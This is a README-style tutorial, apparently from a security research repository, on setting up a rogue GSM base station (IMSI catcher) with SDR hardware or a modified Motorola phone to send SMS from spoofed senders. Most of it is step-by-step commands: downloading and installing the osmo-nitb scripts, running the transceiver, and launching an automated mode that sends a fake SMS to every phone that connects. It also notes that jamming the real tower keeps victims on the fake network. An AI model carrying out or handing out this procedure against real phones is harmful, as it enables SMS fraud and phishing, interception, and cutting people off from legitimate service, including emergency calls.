# GSM3_IMSICATCHER_HALFMITM_FAKE-SMS-SENDER
# GSM_IMSICATCHER_HALFMITM_SPOOFING-SMS-WITHOUT-PHYSICAL-MS
* [motorola](https://www.youtube.com/watch?v=ZKa86zAWmQY&pp=ygURZ3NtIHNuaWZmaW5nIDI5YzM%3D) documentation
* [spoofing](https://github.com/godfuzz3r/osmo-nitb-scripts/tree/master)
* [phddays](https://sudonull.com/post/97315-MiTM-Mobile-contest-how-they-broke-mobile-communications-at-PHDays-V-Positive-Technologies-blog)
* [script](https://lucasteske.medium.com/creating-your-own-gsm-network-with-limesdr-1935bac257f4)
  
# Half MITM = Fake BTS only
<p align="center">
  <img width="600" height="400" src="https://github.com/SitrakaResearchAndPOC/GSM_IMSICATCHER_HALFMITM_SPOOFING-SMS-WITH-PHYSICAL-MS/blob/main/2G.jpg">
</p>

# Why it is possible ?
* Fake base station with open ciphering named A5/0, and the  network could be GSM(sms, call), and GPRS, EDGE

# Attack limitations and advantages 
* local attack but could be targeting (to find local victim)
* victim couldn't be reached on the real network (indeed call and sms)
* could be detectable with rooted phone and application like imsi-catcher detector, snoopsnitch because of open network

# Devices  
* USRP
* motorola phone (aka calypso phone on google)
* LimeSDR
  
# Pratices
* Install DragonOS 29 or 30
* Create fake bts with open ciphering (A5/0)
* Modify the config.json to send sms with fake sms sender

# Solutions :
* Solution 1 using USRP  
(more stable and no need synchronization of existing BTS so if we jam the existing BTS the half mitm still exists)
```
wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/osmo-nitb-scripts.zip
```
```
unzip osmo-nitb-scripts.zip
```
```
cd osmo-nitb-scripts
```
Database is at : /var/lib/osmocom/hlr.sqlite3  
Installing all config  
```
bash install_services.sh
```
Running the transceiver
```
osmo-trx-uhd -C /etc/osmocom/osmo-trx-uhd.cfg
```
Running main_uhd associate with configs/openbsc.cfg  
Compare the two configs openbsc_spoof.cfg  and openbsc.cfg  to find the difference.  
Use command diff to compare two files
Results : With openbsc.cfg, not possible to send call and sms (just fake sms sender)  
ctrl+shift+T  
```
cd osmo-nitb-scripts
```
Compare the two scripts main_uhd_spoof.py and main_uhd.py to find the difference.  
Use command diff to compare two files
Results : main_uhd_spoof.py uses openbsc_spoof.cfg  and main_uhd.py  uses openbsc.cfg
```
python3 main_uhd.py
```
Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01  
Tape `*#001#` for finding your phone number (extension with osmo-bts)   

  
Configure config.json and test the ussd on it  
```
python3 interact.py
```

For automated fake sms sender in each connection on the BTS
Relaunch all setup but use this command instead of python3 main_uhd.py
```
python3 main_uhd.py -u -c config.json
```




* Solution 2 : using one motorola phone  
(Not so stable and  need synchronization of existing BTS by finding arfcn of synchronization so if we jam the existing BTS the half mitm doesn't exist anymore)

Hardware setup 1 : Need battery and not programmable with arduino  

[serial_cable](https://osmocom.org/projects/baseband/wiki/Serial_Cable)    [smartspate](https://www.smartspate.com/how-to-create-2g-network-at-your-own-home/)   [sudonull](https://sudonull.com/post/69473-Launching-a-GSM-network-at-home-Pentestit-Blog)
<p align="center">
  <img src="https://github.com/SitrakaResearchAndPOC/GSM_IMSICATCHER_HALFMITM_SPOOFING-SMS-WITH-PHYSICAL-MS/blob/main/usb_motorola.jpg">
</p>

<p align="center">
  <img width="600" height="400" src="https://github.com/SitrakaResearchAndPOC/GSM_IMSICATCHER_HALFMITM_SPOOFING-SMS-WITH-PHYSICAL-MS/blob/main/usb_cable_final.png">
</p>


Hardware setup 2 : No need battery and programmable with arduino  
<p align="center">
  <img src="https://github.com/SitrakaResearchAndPOC/GSM_IMSICATCHER_HALFMITM_SPOOFING-SMS-WITH-PHYSICAL-MS/blob/main/USB_TTL.jpg">
</p>


Command you need : 
```
dmesg | grep ttyUSB*
```

```
wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/osmo-nitb-scripts-calypsobts.zip
```
```
unzip osmo-nitb-scripts-calypsobts.zip 
```
```
cd osmo-nitb-scripts-calypsobts
```
Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
Installing network signal guru on your android phone  
And finding the arfcn that this one is connect  
Let's name this arfcn as 975  
Configure arfcn at service/osmotrx.lms as 975
```
gedit service/osmotrx.lms
```
Save the configuration
```
bash install_services.sh 
```
```
bash trx.sh
```
Click button power of motorola phone  
Tape ctrl+shift+T
```
cd osmo-nitb-scripts-calypsobts
```
Database at : /usr/src/CalypsoBTS/hlr.sqlite3
Running main_uhd associate with configs/openbsc.cfg  
Compare the two configs openbsc_spoof.cfg  and openbsc.cfg  to find the difference.  
Use command diff to compare two files
Results : With openbsc.cfg, not possible to send call and sms (just fake sms sender)  

  
Compare the two scripts main_spoof.py and main.py to find the difference.  
Use command diff to compare two files
Results : main_spoof.py uses openbsc_spoof.cfg  and main.py  uses openbsc.cfg
```
python3 main.py
```
Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01  
Tape `*#001#` for finding your phone number (extension with osmo-bts)   

  
Configure config.json and test the ussd on it  
```
python3 interact.py
```

For automated fake sms sender in each connection on the BTS
Relaunch all setup but use this command instead of python3 main.py
```
python3 main.py -u -c config.json
```
